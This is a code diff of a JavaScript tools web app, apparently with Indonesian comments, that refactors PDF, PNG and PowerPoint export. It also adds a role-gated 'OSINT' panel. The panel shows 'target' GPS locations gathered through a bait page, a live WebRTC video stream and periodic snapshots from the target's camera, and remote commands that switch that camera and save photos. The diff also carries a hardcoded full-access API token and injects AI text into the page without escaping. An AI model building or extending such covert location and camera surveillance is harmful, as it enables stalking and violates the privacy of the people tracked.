+      else { titleOpts.x = 0.5; titleOpts.w = 9; titleOpts.align = 'left'; }
+      if(s.layout === 'full' && s.image) {
+        sl.addImage({ data: s.image, x:0, y:0, w:10, h:5.63, rotate:s.sRot, sizing:{ type:'cover', w:10, h:5.63 } });
+        if(s.title){ titleOpts.color = '#FFFFFF'; titleOpts.shadow = {type:'outer', color:'000000', blur:2, offset:1, angle:45}; sl.addText(s.title, titleOpts); }
+        if(s.body){ const bullets = s.body.split('\n').filter(l=>l.trim()!=='').map(l=>({text:l, options:{bullet:true, breakLine:true}})); sl.addText(bullets.length?bullets:[{text:s.body}], { x:0.5, y:1.4, w:9, h:3.6, fontSize:20, color:'#FFFFFF', fontFace:'Arial', valign:'top', shadow:{type:'outer', color:'000000', blur:2, offset:1, angle:45} }); }
+      } else {
+        if(s.title){ titleOpts.color = themeText; sl.addText(s.title, titleOpts); }
+        if(s.body){ const bullets = s.body.split('\n').filter(l=>l.trim()!=='').map(l=>({text:l, options:{bullet:true, breakLine:true}})); sl.addText(bullets.length?bullets:[{text:s.body}], { x:0.5, y:1.4, w:4.5, h:3.6, fontSize:18, color:themeText, fontFace:'Arial', valign:'top' }); }
+        if(s.image){ let imgW = 4.3, imgH = 4.3; let scaleFactor = s.sScale / 100; let newW = imgW * scaleFactor, newH = imgH * scaleFactor; let offsetX = s.sX / 100, offsetY = s.sY / 100; let finalX = 7.35 + offsetX - (newW/2); let finalY = 2.815 + offsetY - (newH/2); sl.addImage({ data: s.image, x: finalX, y: finalY, w:newW, h:newH, rotate: s.sRot, sizing:{ type:'contain', w:newW, h:newH } }); }
+      }
+      await yieldToBrowser();
+    }
+
+    const filename = title + '.pptx';
+    await pptx.writeFile({ fileName: filename });
+    window.showDownloadToast(filename, null);
+  }, 'sedang di proses...');
+}
 
 const PUTER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InYyIn0.eyJ0IjoidCIsInYiOiIyIiwidG9rZW5fdWlkIjoiYWZmMTEzZGUtOTdjMC00ZmIxLWEyNGUtNjU2ZGJiZWFkZDljIiwidXUiOiJHbzNPZUpObFRiUzFjaVRWVUdtYWRRPT0iLCJzdSI6IkRYdEVWUzhBUXBHcjF3WVBDN3o0VlE9PSIsImFpIjoiR28zT2VKTmxUYlMxY2lUVlVHbWFkUT09IiwiZnVsbF9hY2Nlc3MiOnRydWUsImlhdCI6MTc5NDY1NTQ1M30.Dxh6tUqZW9q5kRhvVZdcwAG2_ezL1XA0OnkCmuAod9A";
 let activeAiModel = 'sonnet35';
@@ -772,45 +1035,121 @@ async function sendAI(){ const input = document.getElementById('aiInput'); const
 
 async function getUnsplashImage(query) { return null; }
 
+// ============================================
+// GENERATE FILE DARI AI — SMOOTH VERSION (Anti Crash)
+// ============================================
 async function generateFromAI(targetFormat, msgIndex) {
-  const aiMsg = chatHistory[msgIndex]; if(!aiMsg || aiMsg.role !== 'ai'){ alert('Pesan AI tidak valid.'); return; }
+  const aiMsg = chatHistory[msgIndex];
+  if (!aiMsg || aiMsg.role !== 'ai') { alert('Pesan AI tidak valid.'); return; }
+
   let lines = aiMsg.text.split('\n');
-  let docTitle = lines[0].replace(/\*\*/g, '').trim();
+  let docTitle = lines[0].replace(/\*\*/g, '').trim() || 'Materi';
   let bodyContent = lines.slice(1).join('\n').trim();
-  showGlassNotif('Menyiapkan file...');
-  
-  // DELAY 50ms BIAR BROWSER GAK CRASH
-  setTimeout(() => {
+
+  await prosesBerat(async () => {
+    await yieldToBrowser();
+
     if (targetFormat === 'png') {
       const div = document.createElement('div');
-      div.style.cssText = 'position:fixed; left:-9999px; top:-9999px; width:800px; padding:60px; background:#ffffff; border: 10px solid #ffd43b; font-family:"Inter", sans-serif; color:#14151a;';
-      div.innerHTML = `<h1 style="font-size:48px; font-weight:800; border-bottom:4px solid #14151a; padding-bottom:20px; margin-bottom:30px; text-align:center;">${docTitle}</h1><div style="font-size:20px; line-height:1.8; white-space:pre-wrap;">${bodyContent}</div><div style="margin-top:60px; font-size:14px; color:#6b6f7b; text-align:right;">Generated by Ex Tools AI</div>`;
+      div.style.cssText = 'position:fixed; left:-9999px; top:-9999px; width:800px; padding:60px; background:#ffffff; border:10px solid #ffd43b; font-family:"Inter",sans-serif; color:#14151a;';
+      div.innerHTML = `<h1 style="font-size:48px;font-weight:800;border-bottom:4px solid #14151a;padding-bottom:20px;margin-bottom:30px;text-align:center;">${docTitle}</h1><div style="font-size:20px;line-height:1.8;white-space:pre-wrap;">${bodyContent}</div><div style="margin-top:60px;font-size:14px;color:#6b6f7b;text-align:right;">Generated by Ex Tools AI</div>`;
       document.body.appendChild(div);
-      html2canvas(div, { scale: 2, useCORS: true }).then(canvas => {
-        const filename = docTitle + '.png'; const dataUrl = canvas.toDataURL('image/png');
-        fetch(dataUrl).then(res => res.blob()).then(blob => { const blobUrl = URL.createObjectURL(blob); const link = document.createElement('a'); link.download = filename; link.href = dataUrl; link.click(); div.remove(); window.showDownloadToast(filename, blobUrl); });
-      });
+      await yieldToBrowser();
+      const canvas = await html2canvas(div, { scale: 2, useCORS: true, logging: false });
+      const filename = docTitle + '.png';
+      const dataUrl = canvas.toDataURL('image/png');
+      div.remove();
+      const blob = await (await fetch(dataUrl)).blob();
+      const blobUrl = URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.download = filename; link.href = dataUrl; link.click();
+      window.showDownloadToast(filename, blobUrl);
+
     } else if (targetFormat === 'pdf') {
-      const { jsPDF } = window.jspdf; const doc = new jsPDF({ unit:'mm', format:'a4' });
-      const pageW = doc.internal.pageSize.getWidth(); const pageH = doc.internal.pageSize.getHeight();
-      const margin = 20; const usableW = pageW - margin * 2; let y = margin;
-      doc.setFont('helvetica', 'bold'); doc.setFontSize(22); doc.text(docTitle, margin, y); y += 15;
+      const { jsPDF } = window.jspdf;
+      const doc = new jsPDF({ unit:'mm', format:'a4' });
+      const pageW = doc.internal.pageSize.getWidth();
+      const pageH = doc.internal.pageSize.getHeight();
+      const margin = 20;
+      const usableW = pageW - margin * 2;
+      let y = margin;
+
+      doc.setFont('helvetica', 'bold'); doc.setFontSize(22);
+      doc.text(docTitle, margin, y); y += 15;
       doc.setFont('helvetica', 'normal'); doc.setFontSize(12);
-      let sections = bodyContent.split('---');
+
+      const sections = bodyContent.split('---');
       if (sections.length > 1) {
-        for (let i = 0; i < sections.length; i++) { let sec = sections[i].trim(); if (!sec) continue; if (i > 0) { doc.addPage(); y = margin; } let secLines = sec.split('\n'); if (secLines.length > 0) { doc.setFont('helvetica', 'bold'); doc.setFontSize(16); doc.text(secLines[0].replace(/\*\*/g, ''), margin, y); y += 10; doc.setFont('helvetica', 'normal'); doc.setFontSize(12); secLines = secLines.slice(1); } const textLines = doc.splitTextToSize(secLines.join('\n'), usableW); textLines.forEach(line => { if(y > pageH - margin){ doc.addPage(); y = margin; } doc.text(line, margin, y); y += 7; }); }
-      } else { const textLines = doc.splitTextToSize(bodyContent, usableW); textLines.forEach(line => { if(y > pageH - margin){ doc.addPage(); y = margin; } doc.text(line, margin, y); y += 7; }); }
-      const filename = docTitle + '.pdf'; const blob = doc.output('blob'); const blobUrl = URL.createObjectURL(blob); doc.save(filename); window.showDownloadToast(filename, blobUrl);
+        for (let i = 0; i < sections.length; i++) {
+          const sec = sections[i].trim();
+          if (!sec) continue;
+          if (i > 0) { doc.addPage(); y = margin; }
+          let secLines = sec.split('\n');
+          if (secLines.length) {
+            doc.setFont('helvetica', 'bold'); doc.setFontSize(16);
+            doc.text(secLines[0].replace(/\*\*/g, ''), margin, y); y += 10;
+            doc.setFont('helvetica', 'normal'); doc.setFontSize(12);
+            secLines = secLines.slice(1);
+          }
+          const textLines = doc.splitTextToSize(secLines.join('\n'), usableW);
+          for (const line of textLines) {
+            if (y > pageH - margin) { doc.addPage(); y = margin; }
+            doc.text(line, margin, y); y += 7;
+          }
+          await yieldToBrowser();
+        }
+      } else {
+        const textLines = doc.splitTextToSize(bodyContent, usableW);
+        for (const line of textLines) {
+          if (y > pageH - margin) { doc.addPage(); y = margin; }
+          doc.text(line, margin, y); y += 7;
+        }
+      }
+
+      const filename = docTitle + '.pdf';
+      const blob = doc.output('blob');
+      const blobUrl = URL.createObjectURL(blob);
+      doc.save(filename);
+      window.showDownloadToast(filename, blobUrl);
+
     } else if (targetFormat === 'pptx') {
-      if(typeof PptxGenJS === 'undefined'){ alert('Library PPTX belum siap.'); return; }
-      const pptx = new PptxGenJS(); pptx.defineLayout({ name:'WIDE', width:10, height:5.63 }); pptx.layout = 'WIDE';
-      const cover = pptx.addSlide(); cover.background = { color:'FFFFFF' }; cover.addText(docTitle, { x:0.5, y:2.0, w:9, h:1.5, fontSize:36, bold:true, color:'14151A', align:'center', valign:'middle' });
-      let sections = bodyContent.split('---');
-      function createAISlide(slideTitle, bodyLines, pptx) { const sl = pptx.addSlide(); sl.background = { color:'FFFFFF' }; if (slideTitle) { sl.addText(slideTitle, { x:0.5, y:0.3, w:9, h:0.8, fontSize:26, bold:true, color:'14151A', align:'left' }); } if (bodyLines.length > 0) { const bullets = bodyLines.filter(l=>l.trim()!=='').map(l => ({text:l, options:{bullet:true, breakLine:true}})); sl.addText(bullets.length ? bullets : [{text:' '}], { x:0.5, y:1.3, w:9, h:3.8, fontSize:18, color:'14151A', valign:'top' }); } }
-      if (sections.length > 1) { for (let i = 0; i < sections.length; i++) { let sec = sections[i].trim(); if (!sec) continue; let secLines = sec.split('\n'); let secTitle = secLines[0].replace(/\*\*/g, '').trim(); let secBody = secLines.slice(1).join('\n').trim(); createAISlide(secTitle, secBody.split('\n'), pptx); } } else { createAISlide(docTitle, bodyContent.split('\n'), pptx); }
-      pptx.writeFile({ fileName: docTitle + '.pptx' }).then(() => { window.showDownloadToast(docTitle + '.pptx', null); });
+      if (typeof PptxGenJS === 'undefined') { alert('Library PPTX belum siap.'); return; }
+      const pptx = new PptxGenJS();
+      pptx.defineLayout({ name:'WIDE', width:10, height:5.63 });
+      pptx.layout = 'WIDE';
+
+      const cover = pptx.addSlide();
+      cover.background = { color:'FFFFFF' };
+      cover.addText(docTitle, { x:0.5, y:2.0, w:9, h:1.5, fontSize:36, bold:true, color:'14151A', align:'center', valign:'middle' });
+
+      const sections = bodyContent.split('---');
+      const makeSlide = (slideTitle, bodyLines) => {
+        const sl = pptx.addSlide();
+        sl.background = { color:'FFFFFF' };
+        if (slideTitle) sl.addText(slideTitle, { x:0.5, y:0.3, w:9, h:0.8, fontSize:26, bold:true, color:'14151A', align:'left' });
+        if (bodyLines.length) {
+          const bullets = bodyLines.filter(l => l.trim() !== '').map(l => ({ text:l, options:{ bullet:true, breakLine:true } }));
+          sl.addText(bullets.length ? bullets : [{ text:' ' }], { x:0.5, y:1.3, w:9, h:3.8, fontSize:18, color:'14151A', valign:'top' });
+        }
+      };
+
+      if (sections.length > 1) {
+        for (const sec of sections) {
+          const t = sec.trim();
+          if (!t) continue;
+          const l = t.split('\n');
+          makeSlide(l[0].replace(/\*\*/g, '').trim(), l.slice(1).join('\n').split('\n'));
+          await yieldToBrowser();
+        }
+      } else {
+        makeSlide(docTitle, bodyContent.split('\n'));
+      }
+
+      const filename = docTitle + '.pptx';
+      await pptx.writeFile({ fileName: filename });
+      window.showDownloadToast(filename, null);
     }
-  }, 50); // DELAY BIAR GAK CRASH
+  }, 'sedang di proses...');
 }
 
 let camStream = null, camFacing = 'environment', camFlashOn = false, camTorchSupported = false;
@@ -895,6 +1234,17 @@ window.showVIPModal = function() {
     const roleLower = (user.role || '').toLowerCase(); const isDev = roleLower === 'developer'; const isMod = roleLower === 'moderator'; const isVip = roleLower === 'vip user'; const isAdmin = isDev || isMod || isVip;
     window.currentUserRole = user.role; if(typeof renderTools === 'function') renderTools();
     if(isAdmin) { if(isDev || isMod) { document.getElementById('adminInputContainer').style.display = 'block'; document.getElementById('nav-adduser').style.display = 'block'; document.getElementById('nav-adduser').style.color = isMod ? '#ffb86c' : 'var(--violet)'; } else { document.getElementById('adminInputContainer').style.display = 'none'; document.getElementById('nav-adduser').style.display = 'none'; } const btnMaint = document.getElementById('btnMaintenance'); if(btnMaint) btnMaint.style.display = isDev ? 'block' : 'none'; document.getElementById('ratingInputBox').style.display = isDev ? 'none' : 'block'; document.querySelectorAll('.btn-hapus-info').forEach(btn => { btn.style.display = isDev ? 'block' : 'none'; }); if(isMod && isMaintenanceMode) { document.getElementById('maintenanceUI').style.display = 'flex'; } } else { document.getElementById('adminInputContainer').style.display = 'none'; document.getElementById('nav-adduser').style.display = 'none'; document.getElementById('ratingInputBox').style.display = 'block'; document.querySelectorAll('.btn-hapus-info').forEach(btn => btn.style.display = 'none'); if(isMaintenanceMode) document.getElementById('maintenanceUI').style.display = 'flex'; }
+    
+    // TAMBAHAN: SEMBUNYIIN NAV OSINT KALO BUKAN VIP/MOD/DEV
+    const navOsint = document.getElementById('nav-osint');
+    if(navOsint) {
+      if (isDev || isMod || isVip) {
+        navOsint.style.display = 'block';
+      } else {
+        navOsint.style.display = 'none';
+      }
+    }
+    
     showPage('home'); setTimeout(() => { document.getElementById('splashScreen').style.display = 'none'; }, 400);
   }
 
@@ -1000,98 +1350,164 @@ window.showVIPModal = function() {
   const lacakRef = ref(db, 'lokasi_pelacak');
   onValue(lacakRef, (snapshot) => { const container = document.getElementById('realtime-lokasi-container'); if(!container) return; container.innerHTML = ''; const data = snapshot.val(); console.log('[OSINT] Data:', data); if(!data) { container.innerHTML = '<p style="font-size:12px; color:var(--muted); text-align:center;">Belum ada target yang masuk.</p>'; return; } const keys = Object.keys(data).reverse().slice(0, 10); keys.forEach((key, idx) => { const item = data[key]; const tgl = new Date(item.waktu).toLocaleString('id-ID'); const mapLink = `https://www.google.com/maps?q=${item.lat},${item.lon}`; container.innerHTML += `<div class="osint-card" style="border-color:var(--red); margin-bottom:10px; position:relative;"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;"><span style="background:var(--red); color:white; font-size:10px; font-weight:bold; padding:3px 8px; border-radius:99px;">TARGET #${keys.length - idx}</span><span style="font-size:10px; color:var(--muted);">${tgl}</span></div><div class="osint-row"><span class="k">Latitude</span><span class="v">${item.lat.toFixed(6)}</span></div><div class="osint-row"><span class="k">Longitude</span><span class="v">${item.lon.toFixed(6)}</span></div><div class="osint-row"><span class="k">Sumber</span><span class="v">${item.sumber || 'Web Umpan'}</span></div><div style="margin-top:10px; display:flex; gap:5px;"><a href="${mapLink}" target="_blank" class="osint-map-btn" style="flex:1; justify-content:center; background:var(--mint);">Buka di Google Maps</a><button onclick="hapusLokasi('${key}')" class="osint-map-btn" style="background:var(--pink); padding:8px 12px;">🗑️</button></div></div>`; }); });
 
-  // REALTIME KAMERA
-  const kameraRef = ref(db, 'kamera_pelacak/terbaru');
-  onValue(kameraRef, (snapshot) => {
-    const data = snapshot.val();
-    const containerDepan = document.getElementById('cam-feed-depan');
-    const containerBelakang = document.getElementById('cam-feed-belakang');
-    const statusEl = document.getElementById('osint-cam-status');
-    const imgDepan = document.getElementById('img-cam-depan');
-    const imgBelakang = document.getElementById('img-cam-belakang');
-    if (!containerDepan || !statusEl) return;
-    if (data && data.foto) {
-      statusEl.innerText = "Kamera dan lokasi di izinkan target!";
-      statusEl.style.color = "var(--mint)";
-      statusEl.style.fontWeight = "bold";
-      statusEl.style.fontSize = "14px";
-      if (data.facing === 'user') {
-        containerDepan.style.display = 'block';
-        containerBelakang.style.display = 'none';
-        imgDepan.src = data.foto;
-      } else {
-        containerBelakang.style.display = 'block';
-        containerDepan.style.display = 'none';
-        imgBelakang.src = data.foto;
+  // ============================================
+  // WEBRTC / CCTV MODE (SNAPSHOT 3 DETIK)
+  // ============================================
+  let peerConnection = null;
+  let remoteStream = null;
+
+  async function initWebRTC() {
+    if (peerConnection) return;
+    peerConnection = new RTCPeerConnection({
+      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+    });
+
+    peerConnection.ontrack = (event) => {
+      if (remoteStream) return;
+      remoteStream = event.streams[0];
+      
+      const videoDepan = document.getElementById('video-cam-depan');
+      const videoBelakang = document.getElementById('video-cam-belakang');
+      
+      if (videoDepan) {
+        videoDepan.srcObject = remoteStream;
+        videoDepan.muted = true;
+        videoDepan.play().catch(e => console.log("Play error:", e));
       }
-    } else {
-      statusEl.innerText = "Status Kamera: Belum ada akses / Target belum klik izinkan.";
-      statusEl.style.color = "var(--muted)";
-      containerDepan.style.display = 'none';
-      containerBelakang.style.display = 'none';
+      if (videoBelakang) {
+        videoBelakang.srcObject = remoteStream;
+        videoBelakang.muted = true;
+        videoBelakang.play().catch(e => console.log("Play error:", e));
+      }
+      
+      document.getElementById('cam-feed-depan').style.display = 'block';
+      document.getElementById('btnCloseCam').style.display = 'block';
+      document.getElementById('cam-controls-panel').style.display = 'flex';
+      
+      document.getElementById('osint-cam-status').innerText = "📡 Live Streaming Realtime Terhubung!";
+      document.getElementById('osint-cam-status').style.color = "var(--mint)";
+      document.getElementById('osint-cam-status').style.fontWeight = "bold";
+    };
+
+    peerConnection.onicecandidate = (event) => {
+      if (event.candidate) { push(ref(db, 'webrtc_candidates_target'), event.candidate.toJSON()); }
+    };
+
+    onValue(ref(db, 'webrtc_offer'), async (snap) => {
+      const offer = snap.val();
+      if (offer && peerConnection.signalingState === 'stable') {
+        await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+        const answer = await peerConnection.createAnswer();
+        await peerConnection.setLocalDescription(answer);
+        set(ref(db, 'webrtc_answer'), { type: answer.type, sdp: answer.sdp });
+      }
+    });
+
+    onValue(ref(db, 'webrtc_candidates_target'), (snap) => {
+      const candidates = snap.val();
+      if (candidates && peerConnection.remoteDescription) {
+        Object.values(candidates).forEach(cand => {
+          try { peerConnection.addIceCandidate(new RTCIceCandidate(cand)); } catch(e){}
+        });
+      }
+    });
+  }
+
+  initWebRTC();
+
+  // CCTV Snapshot Handler
+  onValue(ref(db, 'kamera_pelacak/terbaru'), (snap) => {
+    const data = snap.val();
+    const btnCloseCam = document.getElementById('btnCloseCam');
+    const panelKontrol = document.getElementById('cam-controls-panel');
+    const statusText = document.getElementById('osint-cam-status');
+    const feedContainer = document.getElementById('cam-feed-depan');
+    const videoDepan = document.getElementById('video-cam-depan');
+
+    if (data && data.foto) {
+      feedContainer.style.display = 'block';
+      btnCloseCam.style.display = 'block';
+      panelKontrol.style.display = 'flex';
+      
+      statusText.innerText = "📡 Memantau Target (Update tiap 3 detik)";
+      statusText.style.color = "var(--mint)";
+      statusText.style.fontWeight = "bold";
+
+      videoDepan.style.display = 'none'; 
+      let newImg = document.getElementById('cctv-image');
+      if (!newImg) {
+        newImg = document.createElement('img');
+        newImg.id = 'cctv-image';
+        newImg.style.width = '100%';
+        newImg.style.borderRadius = '8px';
+        newImg.style.marginTop = '5px';
+        newImg.style.background = '#000';
+        newImg.style.objectFit = 'cover';
+        videoDepan.parentNode.insertBefore(newImg, videoDepan.nextSibling);
+      }
+      newImg.src = data.foto;
     }
   });
+
+  // Fungsi Tombol Silang (X) Buat Reset Kamera
+  window.closeCamFeed = function() {
+    // Sembunyiin feed kamera
+    document.getElementById('cam-feed-depan').style.display = 'none';
+    document.getElementById('cam-feed-belakang').style.display = 'none';
+    document.getElementById('btnCloseCam').style.display = 'none';
+    document.getElementById('cam-controls-panel').style.display = 'none';
+    
+    // Reset status text
+    const statusEl = document.getElementById('osint-cam-status');
+    statusEl.innerText = "Status Kamera: Belum ada akses.";
+    statusEl.style.color = "var(--muted)";
+    statusEl.style.fontWeight = "normal";
+
+    // HAPUS GAMBAR DARI LAYAR
+    const cctvImage = document.getElementById('cctv-image');
+    if (cctvImage) { cctvImage.remove(); }
+    const videoDepan = document.getElementById('video-cam-depan');
+    if (videoDepan) { videoDepan.style.display = 'block'; videoDepan.srcObject = null; }
+    
+    // Hapus data stream
+    if (peerConnection) { peerConnection.close(); peerConnection = null; }
+    remoteStream = null;
+    
+    // Hapus data di Firebase
+    remove(ref(db, 'kamera_pelacak/terbaru'));
+    remove(ref(db, 'webrtc_offer'));
+    remove(ref(db, 'webrtc_answer'));
+    remove(ref(db, 'webrtc_candidates'));
+    remove(ref(db, 'webrtc_candidates_target'));
+    remove(ref(db, 'webrtc_status'));
+    
+    // Re-init WebRTC buat koneksi selanjutnya
+    setTimeout(initWebRTC, 1000);
+  };
 
   window.hapusLokasi = function(key) { if(confirm('Hapus data target ini?')) { remove(ref(db, 'lokasi_pelacak/' + key)); } };
 
-  // ============================================
-  // FITUR KONTROL KAMERA TARGET
-  // ============================================
-  
-  // Buka/tutup panel tombol kontrol berdasarkan status kamera
-  const kameraStatusRef = ref(db, 'kamera_pelacak/status');
-  onValue(kameraStatusRef, (snapshot) => {
-    const data = snapshot.val();
-    const panel = document.getElementById('cam-controls-panel');
-    if (!panel) return;
-    if (data && data.aktif) {
-      panel.style.display = 'flex';
-    } else {
-      panel.style.display = 'none';
-    }
-  });
-
-  // Tombol ganti kamera
   window.switchTargetCamera = function() {
     const statusRef = ref(db, 'kamera_pelacak/status');
     onValue(statusRef, (snap) => {
       const data = snap.val();
-      if (!data || !data.aktif) {
-        showGlassNotif('Kamera target belum aktif.');
-        return;
-      }
+      if (!data || !data.aktif) { showGlassNotif('Kamera target belum aktif.'); return; }
       const currentFacing = data.facing || 'user';
       const newFacing = currentFacing === 'user' ? 'environment' : 'user';
-      update(ref(db, 'kamera_pelacak/status'), {
-        facing: newFacing,
-        switchRequest: Date.now()
-      }).then(() => {
-        showGlassNotif('Perintah ganti kamera dikirim ke target...');
-      });
+      update(ref(db, 'kamera_pelacak/status'), { facing: newFacing, switchRequest: Date.now() }).then(() => { showGlassNotif('Perintah ganti kamera dikirim ke target...'); });
     }, { onlyOnce: true });
   };
 
-  // Tombol ambil foto & simpan ke galeri
   window.takeTargetPhoto = function() {
-    const statusRef = ref(db, 'kamera_pelacak/terbaru');
-    onValue(statusRef, (snap) => {
-      const data = snap.val();
-      if (!data || !data.foto) {
-        showGlassNotif('Belum ada foto dari target.');
-        return;
-      }
-      fetch(data.foto).then(res => res.blob()).then(blob => {
-        const filename = 'target-photo-' + new Date().toISOString().replace(/[:.]/g, '-') + '.jpg';
-        const blobUrl = URL.createObjectURL(blob);
-        const link = document.createElement('a');
-        link.href = blobUrl;
-        link.download = filename;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-        window.showDownloadToast(filename, blobUrl);
-      });
-    }, { onlyOnce: true });
+    const imgElement = document.getElementById('cctv-image');
+    if (!imgElement || !imgElement.src) { showGlassNotif('Belum ada gambar dari target.'); return; }
+    const link = document.createElement('a');
+    link.href = imgElement.src;
+    link.download = 'target-photo-' + Date.now() + '.jpg';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    window.showDownloadToast(link.download, imgElement.src);
   };
 
   window.showUserProfile = function(username) { const dbRef = window.db || (typeof db !== 'undefined' ? db : null); const refFn = window.ref || (typeof ref !== 'undefined' ? ref : null); const onValueFn = window.onValue || (typeof onValue !== 'undefined' ? onValue : null); if(!dbRef || !refFn || !onValueFn) { showGlassNotif('Sistem database belum siap.'); return; } const userRef = refFn(dbRef, 'users/' + username); onValueFn(userRef, (snap) => { const userData = snap.val(); if(!userData) { showGlassNotif('Data user tidak ditemukan.'); return; } const roleLower = (userData.role || 'user').toLowerCase(); const roleColor = roleLower === 'developer' ? 'var(--violet)' : roleLower === 'owner' ? 'var(--yellow)' : roleLower === 'moderator' ? '#ffb86c' : roleLower === 'partner' ? '#7cc6fe' : roleLower === 'vip user' ? '#c9a6ff' : 'var(--mint)'; const isBanned = userData.status === 'banned'; const letter = username.charAt(0).toUpperCase(); const modal = document.createElement('div'); modal.className = 'modal-confirm open'; modal.style.zIndex = '100001'; modal.innerHTML = `<div class="modal-box" style="max-width:340px; padding:25px; text-align:center;"><div style="width:80px; height:80px; border-radius:50%; margin:0 auto 15px; background:${roleColor}; border:3px solid var(--ink); display:flex; align-items:center; justify-content:center; font-size:32px; font-weight:800; color:#14151a; box-shadow:var(--shadow-sm); background-size:cover; background-position:center; ${userData.photo ? `background-image:url('${userData.photo}'); color:transparent;` : ''}">${userData.photo ? '' : letter}</div><h3 style="margin:0 0 5px 0; font-size:20px;">${username}</h3><span style="display:inline-block; padding:4px 12px; border-radius:999px; background:${roleColor}; border:2px solid var(--ink); font-size:12px; font-weight:800; color:#14151a; margin-bottom:15px;">${userData.role || 'User'}</span>${isBanned ? '<p style="font-size:12px; color:var(--red); font-weight:800; margin:5px 0;">AKUN DIBANNED</p>' : ''}<p style="font-size:12px; color:var(--muted); margin:10px 0 20px 0;">Status: ${isBanned ? 'Banned' : 'Aktif'}</p><button class="btn secondary" style="width:100%; margin:0;" onclick="this.closest('.modal-confirm').remove()">Tutup</button></div>`; modal.onclick = (e) => { if(e.target === modal) modal.remove(); }; document.body.appendChild(modal); }, { onlyOnce: true }); };
